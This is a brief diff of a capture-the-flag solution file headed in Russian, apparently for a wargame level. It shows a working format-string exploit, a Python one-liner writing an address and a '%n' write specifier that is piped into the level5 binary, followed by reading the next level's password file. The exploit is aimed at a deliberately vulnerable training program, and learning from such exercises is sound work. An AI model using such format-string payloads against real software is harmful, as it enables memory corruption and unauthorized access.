@@ -1,6 +1,6 @@
 # Решение
-python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /tmp/destroy
-cat /tmp/destroy - | ./level5
+python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /tmp/lvl5
+cat /tmp/lvl5 - | ./level5
 
 cd ../level6
 cat .pass
